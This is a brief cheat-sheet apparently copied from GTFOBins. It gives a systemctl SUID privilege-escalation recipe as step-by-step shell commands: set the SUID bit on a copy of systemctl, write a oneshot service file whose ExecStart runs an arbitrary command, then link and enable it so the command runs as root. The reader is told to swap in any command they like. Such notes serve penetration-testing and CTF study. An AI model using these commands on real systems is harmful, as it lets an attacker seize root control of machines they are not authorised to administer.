https://gtfobins.github.io/

## systemctl
### suid
Go to folder you can write to (/tmp)
```
sudo install -m =xs $(which systemctl) .

TF=$(mktemp).service
echo '[Service]
```
Should bring up a ">" prompt
Change the "id" command for what you want to do:
```
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
```
May have to use full path here:
```
./systemctl link $TF
/bin/systemctl link $TF
```
Same path:
```
./systemctl enable --now $TF
/bin/systemctl enable --now $TF
```
